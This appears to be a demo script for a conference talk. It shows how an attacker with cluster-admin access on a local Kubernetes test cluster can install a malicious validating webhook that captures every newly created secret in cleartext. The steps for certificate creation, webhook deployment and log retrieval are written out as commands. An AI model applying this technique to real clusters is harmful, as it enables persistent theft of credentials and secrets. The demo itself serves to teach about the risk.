#!/bin/bash

########################
# include the magic
########################
. ./lib/demo-magic.sh
TYPE_SPEED=25
cd 1-validatingwebhooks
clear

echo ""

p "# We have compromised our demo cluster and have cluster admin access"
kubectx kind-kind 2> /dev/null 1> /dev/null

pe "kubectl get nodes" 
pe "kubectl get pods --all-namespaces && kubectl get secrets" 
pe "clear"

p "# Validating webhooks require TLS, so we can generate a\n self-signed certificate"
pe "./1-create-signed-cert.sh"
pe "kubectl get secret validator"

p "# Export the certificate we just created"
pe "kubectl get secret validator -o json | jq -r '.data.\"cert.pem\"' > cert.pem"
pe "clear"

p "# Install the malicious validating webhook application named\n \"validator\" to capture all secrets"
pe "kubectl apply -f validator.yaml"

p "# View the validating webhook configuration"
pe "./webhook.sh"

p "# Install the validating webhook configuration"
pe './webhook.sh | kubectl apply -f -'

#p "# View the validating webhook configuration"
#pe "kubectl get validatingwebhookconfiguration"

p "# And now, when a regular user creates a new secret like this one"
pe "kubectl create secret generic honk --from-literal=honk=kubeconeu2020"
pe "clear"

p "# The logs of the webhook application now captured the secret in the clear"
LOGPOD="$(kubectl get pod -l app=validator -o name| head -1)"
while [[ $(kubectl get pods -l app=validator -o 'jsonpath={..status.conditions[?(@.type=="Ready")].status}') != "True" ]]; do echo "waiting for pod" && sleep 2; done
pe "kubectl logs ${LOGPOD}"

./cleanup.sh
